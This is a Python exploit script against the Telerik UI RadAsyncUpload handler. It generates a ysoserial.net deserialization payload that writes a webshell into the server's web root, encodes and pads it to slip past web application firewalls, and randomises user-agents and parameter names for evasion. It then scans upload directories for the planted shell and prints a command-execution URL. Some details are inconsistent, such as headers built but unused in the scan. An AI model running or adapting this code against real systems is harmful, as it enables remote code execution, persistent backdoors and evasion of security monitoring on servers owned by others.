import requests
import urllib3
import base64
import subprocess
import random
import string

# 🔴 Suppress SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 🔴 Proxy for Burp Suite Integration
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# 🔴 Target Details
TARGET_URL = "https://target.com/Telerik.Web.UI.WebResource.axd?type=rau"

# 🔍 Common directories where Telerik uploads files
UPLOAD_DIRS = [
    "/uploads/",
    "/UserFiles/",
    "/documents/",
    "/media/",
    "/files/",
    "/temp/",
    "/bundles/",
    "/Scripts/",
    "/app/",
    "/content/",
    "/downloads/",
    "/images/",
    "/report/",
    "/remote/",
    "/errorPages/",
    "/documentation/",
    "/asp_client/",
    "/TelerikUpload/",
    "/assets/",
    "/public/"
]

# 🛠️ Webshell Filenames to Check
SHELL_NAMES = ["shell.aspx", "cmd.aspx", "backdoor.aspx", "webshell.aspx"]

# 🔄 Alternative Extensions for Bypasses
EXTENSIONS = ["", ".bak", ".txt", ";.txt"]

# 🎭 Random User-Agents for Evasion
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; Mobile)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0)"
]

# 🛠️ Random Parameter Obfuscation
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

RAND_PARAM = random_string(6)  # Generates a random parameter name

# 🛠️ Generates the Payload Using ysoserial.net
def generate_payload():
    cmd = ["wine", "ysoserial.exe", "-g", "TypeConfuseDelegate", "-f", "Json.Net", "-o", "base64",
           "-c", "echo 'webshell' > C:\\inetpub\\wwwroot\\uploads\\shell.aspx"]
    
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.decode().strip()

# 🔄 Encode Payload for WAF Bypass
def encode_payload(payload):
    # Base64 + URL Encoding + Random Junk Padding
    encoded = base64.b64encode(payload.encode()).decode()
    double_encoded = requests.utils.quote(encoded)  # URL encode
    junk_padding = ''.join(random.choices(string.ascii_letters, k=16))
    return f"{double_encoded}{junk_padding}"

# 🚀 Sends the Exploit to Telerik (Burp Suite Integrated)
def send_exploit(payload):
    encoded_payload = encode_payload(payload)
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),  # Randomize User-Agent
        "Content-Type": "application/octet-stream",
        RAND_PARAM: encoded_payload  # Obfuscate parameter names
    }

    print(f"[*] Sending exploit via Burp Proxy...")
    response = requests.post(TARGET_URL, data=encoded_payload, headers=headers, verify=False, proxies=PROXY)

    if response.status_code == 200:
        print("[+] Exploit Sent! Scanning for the webshell...")
        scan_webshell()
    else:
        print(f"[-] Exploit failed ({response.status_code}). Check Burp Suite.")

# 🔎 Scan for the Webshell in Common Directories
def scan_webshell():
    for directory in UPLOAD_DIRS:
        for filename in SHELL_NAMES:
            for ext in EXTENSIONS:
                url = f"https://target.com{directory}{filename}{ext}"
                headers = {"User-Agent": random.choice(USER_AGENTS)}  # Randomized User-Agent
                response = requests.get(url, verify=False, proxies=PROXY)

                if response.status_code == 200:
                    print(f"[🔥] Webshell Found: {url}")
                    print(f"    Run commands: {url}?cmd=whoami")
                    return
    print("[-] Webshell Not Found. Try manually scanning.")

# 🔥 Run the Attack
def main():
    print("[*] Generating payload...")
    raw_payload = generate_payload()

    print("[*] Sending exploit via Burp Suite...")
    send_exploit(raw_payload)

if __name__ == "__main__":
    main()
